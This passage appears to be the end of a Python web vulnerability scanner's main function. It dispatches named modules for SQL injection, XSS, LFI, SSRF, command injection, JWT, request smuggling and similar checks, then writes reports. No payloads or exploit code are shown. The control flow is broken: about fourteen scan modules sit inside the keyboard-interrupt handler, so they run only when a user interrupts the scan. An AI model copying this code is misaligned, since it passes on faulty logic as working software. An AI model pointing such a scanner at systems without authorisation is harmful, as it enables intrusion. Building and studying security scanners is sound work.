        if should_run("headers"):      header_issues= module_header_analysis(headers)
        if should_run("dirs"):         module_directories(target_url)
        if should_run("js"):           module_js_recon(target_url, domain)
        if should_run("params"):       module_param_discovery(target_url)
        if should_run("sqli"):         module_sqli(target_url, domain)
        if should_run("xss"):          module_xss(target_url)
        if should_run("lfi"):          module_lfi(target_url)
        if should_run("xxe"):          module_xxe(target_url)
        if should_run("ssrf"):         module_ssrf(target_url)
        if should_run("ssl"):          module_ssl(domain)
        if should_run("nuclei"):       module_nuclei(target_url)
        if should_run("nikto"):        module_nikto(target_url)
        if should_run("idor"):         module_idor_api(target_url)
        if should_run("csrf"):         module_csrf(target_url)
        if should_run("ratelimit"):    module_ratelimit_auth(target_url)
        if should_run("business"):     module_business_logic(target_url, domain)
        if should_run("ai"):           module_ai_advisor(domain, open_ports, header_issues, subdomains)

    except KeyboardInterrupt:
        print(f"\n{yellow('Scan interrupted. Saving partial results...')}")

        if should_run("cve"):          module_cve_scanner(target_url, domain)
        if should_run("ssti"):         module_ssti(target_url)
        if should_run("crlf"):         module_crlf(target_url)
        if should_run("prototype"):    module_prototype_pollution(target_url)
        if should_run("deserial"):     module_deserialization(target_url)
        if should_run("cmdinject"):    module_cmd_injection(target_url)
        if should_run("nosql"):        module_nosqli(target_url)
        if should_run("jwt"):          module_jwt(target_url)
        if should_run("smuggling"):    module_smuggling(target_url)
        if should_run("oauth"):        module_oauth(target_url)
        if should_run("upload"):       module_file_upload(target_url)
        if should_run("hostheader"):   module_host_header_injection(target_url)
        if should_run("infodiscl"):    module_info_disclosure(target_url, domain)
        if should_run("apisec"):       module_api_security(target_url)

    generate_cwe_report(FINDINGS, output_dir, domain)
    generate_report(target_url, domain, ip, output_dir)
    print_summary(domain, ip, output_dir)

if __name__ == "__main__":
    main()
